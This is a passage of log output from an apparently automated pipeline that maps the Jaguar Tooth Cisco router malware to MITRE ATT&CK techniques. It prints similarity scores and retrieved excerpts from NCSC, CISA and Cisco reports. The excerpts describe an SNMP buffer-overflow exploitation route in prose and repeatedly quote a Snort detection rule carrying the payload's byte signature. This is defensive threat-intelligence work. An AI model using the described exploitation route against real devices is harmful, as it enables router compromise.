3S Release Notes, orCisco\xa0IOS XE 3SG Release Notes, depending on the Cisco\xa0IOS\xa0XE Software release.Exploitation and Public AnnouncementsAt the time of initial publication, Cisco was aware of external knowledge of the vulnerabilities described in this advisory and, as a precaution, notified customers about the potential for exploitation.On January 6, 2017, a security researcher published functional exploit code for these vulnerabilities.The Cisco Product Security Incident Response Team (PSIRT) is aware of exploitation of the following vulnerabilities that are described in this advisory:CVE-2017-6736CVE-2017-6737CVE-2017-6738CVE-2017-6739CVE-2017-6740CVE-2017-6742CVE-2017-6743CVE-2017-6744The Cisco PSIRT is aware of exploit code available for CVE-2017-6741.Additional information can be found atCisco TALOS: DNS Hijacking Abuses Trust In Core Internet Service.SourceThese vulnerabilities were found during internal testing.Cisco Security Vulnerability PolicyTo learn about Cisco security vulnerability disclosure policies and publications, see theSecurity Vulnerability Policy.')]
[2025-04-08 17:40:05,804 INFO] ++ Indicators computed for action: File and Directory Discovery as used by the malware. The indicators are:
['The content " | 03   81   60   00   08 |" is present.', 'The content "| 24   02   00   01 |" is present.']
[2025-04-08 17:40:06,231 INFO] ++ Removed pre-condition: 
A Cisco IOS device is accessible.
, due to similarity with: 
The target device runs Cisco IOS software.
 (tensor([[0.7650]]))
[2025-04-08 17:40:06,886 INFO] ++ Removed pre-condition: 
The malware has the ability to execute Cisco IOS CLI commands.
, due to similarity with: 
The malware has access to a command line interface on the target device.
 (tensor([[0.7242]]))
[2025-04-08 17:40:30,486 INFO] ++ Removed post-condition: 
System event logs recording suspicious process executions and network connections
, due to similarity with: 
Network traffic logs showing unusual activity (e.g., connections to command and control servers, data exfiltration)
 (tensor([[0.7486]]))
[2025-04-08 17:40:43,483 INFO] + Processing action: System Network Configuration Discovery as used by the malware
[2025-04-08 17:40:43,724 INFO] ++ Embedding computed for: System Network Configuration Discovery as used by the malware. The vector has shape: (384,)
[2025-04-08 17:40:43,844 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery]: tensor([[0.3677]])
[2025-04-08 17:40:43,953 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: local account]: tensor([[0.3779]])
[2025-04-08 17:40:44,109 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.3132]])
[2025-04-08 17:40:44,225 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: email account]: tensor([[0.2242]])
[2025-04-08 17:40:44,366 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.2413]])
[2025-04-08 17:40:44,551 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [application window discovery]: tensor([[0.3784]])
[2025-04-08 17:40:44,755 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [browser information discovery]: tensor([[0.3505]])
[2025-04-08 17:40:44,927 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.3267]])
[2025-04-08 17:40:45,018 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.2207]])
[2025-04-08 17:40:45,189 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud service discovery]: tensor([[0.3127]])
[2025-04-08 17:40:45,357 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.2945]])
[2025-04-08 17:40:45,529 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3306]])
[2025-04-08 17:40:45,759 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [debugger evasion]: tensor([[0.3300]])
[2025-04-08 17:40:45,941 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [device driver discovery]: tensor([[0.4179]])
[2025-04-08 17:40:46,091 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [domain trust discovery]: tensor([[0.3014]])
[2025-04-08 17:40:46,264 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [file and directory discovery]: tensor([[0.4117]])
[2025-04-08 17:40:46,513 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [group policy discovery]: tensor([[0.4042]])
[2025-04-08 17:40:46,726 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [log enumeration]: tensor([[0.3775]])
[2025-04-08 17:40:46,927 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [network service discovery]: tensor([[0.5240]])
[2025-04-08 17:40:47,062 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [network share discovery]: tensor([[0.3886]])
[2025-04-08 17:40:47,179 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [network sniffing]: tensor([[0.2947]])
[2025-04-08 17:40:47,430 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [password policy discovery]: tensor([[0.3354]])
[2025-04-08 17:40:47,576 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.3521]])
[2025-04-08 17:40:47,844 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery]: tensor([[0.4026]])
[2025-04-08 17:40:48,000 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.3976]])
[2025-04-08 17:40:48,138 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3505]])
[2025-04-08 17:40:48,224 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3193]])
[2025-04-08 17:40:48,347 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [process discovery]: tensor([[0.4357]])
[2025-04-08 17:40:48,512 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [query registry]: tensor([[0.4623]])
[2025-04-08 17:40:48,684 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [remote system discovery]: tensor([[0.4418]])
[2025-04-08 17:40:48,910 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [software discovery]: tensor([[0.4352]])
[2025-04-08 17:40:49,041 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.4918]])
[2025-04-08 17:40:49,195 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system information discovery]: tensor([[0.5025]])
[2025-04-08 17:40:49,323 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system location discovery]: tensor([[0.4104]])
[2025-04-08 17:40:49,420 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.4760]])
[2025-04-08 17:40:49,617 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.6372]])
[2025-04-08 17:40:49,846 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.6397]])
[2025-04-08 17:40:50,055 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.6269]])
[2025-04-08 17:40:50,192 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network connections discovery]: tensor([[0.5877]])
[2025-04-08 17:40:50,379 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.4221]])
[2025-04-08 17:40:50,483 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system service discovery]: tensor([[0.5054]])
[2025-04-08 17:40:50,594 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system time discovery]: tensor([[0.3846]])
[2025-04-08 17:40:50,809 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3194]])
[2025-04-08 17:40:50,988 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3379]])
[2025-04-08 17:40:51,164 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3308]])
[2025-04-08 17:40:51,279 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.2424]])
[2025-04-08 17:40:51,287 INFO] ++ Scores: [('system network configuration discovery: internet connection discovery', tensor([[0.6397]])), ('system network configuration discovery', tensor([[0.6372]])), ('system network configuration discovery: wi-fi discovery', tensor([[0.6269]])), ('system network connections discovery', tensor([[0.5877]])), ('network service discovery', tensor([[0.5240]]))]
[2025-04-08 17:40:51,287 INFO] ++ Similar techniques found:
['system network configuration discovery: internet connection discovery', 'system network configuration discovery', 'system network configuration discovery: wi-fi discovery', 'system network connections discovery', 'network service discovery']
[2025-04-08 17:40:51,287 INFO] ++ Querying the QA model for action System Network Configuration Discovery as used by the malware with the following context:
system network configuration discovery: internet connection discovery
system network configuration discovery
system network configuration discovery: wi-fi discovery
system network connections discovery
network service discovery
[2025-04-08 17:40:52,344 INFO] ++ QA suggested technique: system network configuration discovery
[2025-04-08 17:40:52,344 INFO] ++ Selected technique: system network configuration discovery
[2025-04-08 17:40:55,896 INFO] ++ Refining the action: System Network Configuration Discovery as used by the malware using 7 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy -to-guess community strings, can \nmake a network susceptible to attacks.\n\nWeak SNMP community strings, including the default “ public ,” allowed APT28 to \ngain access to router information.\n\nAPT28 sent additional SNMP commands to enumerate router interfaces.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This included a small number based in Europe, US government institutions and approximately 250 Ukrainian victims.SNMP is designed to allow network administrators to monitor and configure network devices remotely, but it can also be misused to obtain sensitive network information and, if vulnerable, exploit devices to penetrate a network.A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy-to-guess community strings, can make a network susceptible to attacks.Weak SNMP community strings, including the default "public," allowed APT28 to gain access to router information.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Designed to prevent unauthorized direct communication to network devices, infrastructure access control lists (iACLs) are one of the most critical security controls that can be implemented in networks.Details on how customers can apply mitigations and disable the affected MIBs are available in thesecurity advisory.Cisco Talos provided additional details about this specific campaign as well as observations of a larger issue of which this campaign is an example – a rising volume of attacks against aging networking appliances and software across all vendors.')]
[2025-04-08 17:41:18,011 INFO] ++ Pre-conditions computed for action: System Network Configuration Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='7ce50e75-f4d6-4e1e-acdb-a0efddbf862b', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='On January 11, 2018, Cisco updated the advisory, as the Cisco Product Security Incident Response Team (PSIRT) became aware of exploitation of the vulnerabilities described inthe security advisory.As described in the NCSC’s advisory \xa0\xa0the threat actor used weak SNMP community strings (including the default “public” community string) using an IP address unique to their infrastructure allowing them to perform reconnaissance and enumerate router interfaces.Cisco has provided well-known advice for many years to restrict SNMP access only to trusted users.')]
[2025-04-08 17:41:31,406 INFO] ++ Post-conditions computed for action: System Network Configuration Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .')]
[2025-04-08 17:41:35,959 INFO] ++ Indicators computed for action: System Network Configuration Discovery as used by the malware. The indicators are:
['The content contains " | 03   81   60   00   08 | ".', 'The content contains " | 24   02   00   01 | ".']
[2025-04-08 17:41:36,862 INFO] ++ Removed pre-condition: 
Access to the Cisco IOS CLI on the target device.
, due to similarity with: 
The target system is running Cisco IOS software.
 (tensor([[0.7704]]))
[2025-04-08 17:42:28,677 INFO] + Processing action: System Information Discovery as used by the malware
[2025-04-08 17:42:28,865 INFO] ++ Embedding computed for: System Information Discovery as used by the malware. The vector has shape: (384,)
[2025-04-08 17:42:28,952 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery]: tensor([[0.3871]])
[2025-04-08 17:42:29,068 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: local account]: tensor([[0.4209]])
[2025-04-08 17:42:29,242 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.3520]])
[2025-04-08 17:42:29,402 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: email account]: tensor([[0.2578]])
[2025-04-08 17:42:29,608 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.2359]])
[2025-04-08 17:42:29,743 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [application window discovery]: tensor([[0.5004]])
[2025-04-08 17:42:29,914 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [browser information discovery]: tensor([[0.4506]])
[2025-04-08 17:42:30,027 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.2973]])
[2025-04-08 17:42:30,180 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.2050]])
[2025-04-08 17:42:30,358 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud service discovery]: tensor([[0.3048]])
[2025-04-08 17:42:30,528 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.3233]])
[2025-04-08 17:42:30,687 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3647]])
[2025-04-08 17:42:30,958 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [debugger evasion]: tensor([[0.4053]])
[2025-04-08 17:42:31,092 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [device driver discovery]: tensor([[0.4806]])
[2025-04-08 17:42:31,220 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [domain trust discovery]: tensor([[0.3036]])
[2025-04-08 17:42:31,395 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [file and directory discovery]: tensor([[0.4481]])
[2025-04-08 17:42:31,629 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [group policy discovery]: tensor([[0.3694]])
[2025-04-08 17:42:31,816 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [log enumeration]: tensor([[0.4213]])
[2025-04-08 17:42:32,056 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [network service discovery]: tensor([[0.4859]])
[2025-04-08 17:42:32,199 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [network share discovery]: tensor([[0.3436]])
[2025-04-08 17:42:32,326 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [network sniffing]: tensor([[0.3026]])
[2025-04-08 17:42:32,598 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [password policy discovery]: tensor([[0.3204]])
[2025-04-08 17:42:32,802 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.4205]])
[2025-04-08 17:42:33,041 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery]: tensor([[0.4235]])
[2025-04-08 17:42:33,170 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.4222]])
[2025-04-08 17:42:33,267 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3721]])
[2025-04-08 17:42:33,371 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3279]])
[2025-04-08 17:42:33,516 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [process discovery]: tensor([[0.5056]])
[2025-04-08 17:42:33,780 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [query registry]: tensor([[0.5152]])
[2025-04-08 17:42:34,024 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [remote system discovery]: tensor([[0.4570]])
[2025-04-08 17:42:34,160 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [software discovery]: tensor([[0.5590]])
[2025-04-08 17:42:34,259 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.5402]])
[2025-04-08 17:42:34,431 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system information discovery]: tensor([[0.6280]])
[2025-04-08 17:42:34,531 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system location discovery]: tensor([[0.4484]])
[2025-04-08 17:42:34,689 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.5429]])
[2025-04-08 17:42:34,888 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.5505]])
[2025-04-08 17:42:35,096 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.5047]])
[2025-04-08 17:42:35,226 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.5242]])
[2025-04-08 17:42:35,400 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network connections discovery]: tensor([[0.5230]])
[2025-04-08 17:42:35,589 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.5151]])
[2025-04-08 17:42:35,685 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system service discovery]: tensor([[0.5173]])
[2025-04-08 17:42:35,855 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system time discovery]: tensor([[0.3213]])
[2025-04-08 17:42:36,061 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3749]])
[2025-04-08 17:42:36,223 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3970]])
[2025-04-08 17:42:36,407 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3997]])
[2025-04-08 17:42:36,645 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.3129]])
[2025-04-08 17:42:36,654 INFO] ++ Scores: [('system information discovery', tensor([[0.6280]])), ('software discovery', tensor([[0.5590]])), ('system network configuration discovery', tensor([[0.5505]])), ('system location discovery: system language discovery', tensor([[0.5429]])), ('software discovery: security software discovery', tensor([[0.5402]]))]
[2025-04-08 17:42:36,654 INFO] ++ Similar techniques found:
['system information discovery', 'software discovery', 'system network configuration discovery', 'system location discovery: system language discovery', 'software discovery: security software discovery']
[2025-04-08 17:42:36,654 INFO] ++ Querying the QA model for action System Information Discovery as used by the malware with the following context:
system information discovery
software discovery
system network configuration discovery
system location discovery: system language discovery
software discovery: security software discovery
[2025-04-08 17:42:37,658 INFO] ++ QA suggested technique: system information discovery
[2025-04-08 17:42:37,659 INFO] ++ Selected technique: system information discovery
[2025-04-08 17:42:41,313 INFO] ++ Refining the action: System Information Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='9f0df71b-f594-455a-8dd0-8e20bde92d87', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='MITRE ATT&CK® \nThis report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible \nknowledge base of adversary tactics and techniques based on real -world observations.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Any NCSC findings \nand recommendations made have not been provided with the intention of avoiding all risks and \nfollowing the recommendations will not remove all such risk.\n\nOwnership of information risks \nremains with the relevant system owner at all times.\n\nThis information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt \nunder other UK information legislation.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on 